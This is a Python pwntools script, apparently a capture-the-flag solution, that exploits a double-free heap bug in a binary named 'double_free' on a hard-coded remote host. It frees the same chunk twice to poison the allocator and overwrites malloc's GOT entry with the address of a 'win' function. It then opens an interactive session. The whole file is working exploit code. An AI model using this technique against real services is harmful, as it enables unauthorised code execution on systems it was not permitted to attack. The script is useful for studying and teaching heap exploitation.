#!/usr/bin/env python3
from pwn import *

p = remote('107.21.135.41', 12222)
binary =  './double_free'

# p = process(binary)

e = ELF(binary)
mal_addr = e.got['malloc']
win_addr = e.symbols['win']
print("----------------------------------")
print(hex(mal_addr), hex(win_addr))
print("----------------------------------")

END_OF_MENU = b"e.g, l\n"

def malloc(p, size):
    print('--------MALLOC---------')
    p.sendline(b"m %d" %size)
    print(p.recvuntil(END_OF_MENU))

def free(p, index):
    print('--------FREE---------')
    p.sendline(b"f %d" %index)
    print(p.recvuntil(END_OF_MENU))

def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print('--------EDIT---------')
    print(p.recvuntil(END_OF_MENU))

def exit(p):
    p.sendline(b"0") 

def launch_attack(p):
    malloc(p, 8)
    free(p,0)
    free(p,0)
    malloc(p,8)
    # edit(p,1,p64(e.got['malloc']))
    edit(p, 1, p64(0x602078))
    malloc(p,8)
    malloc(p,8)
    # edit(p,3,p64(e.symbols.win))
    edit(p,3,p64(0x400efe))
    p.interactive()


def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p=process(binary)
    p.recvuntil(END_OF_MENU)
    launch_attack(p)

# main()

launch_attack(p)
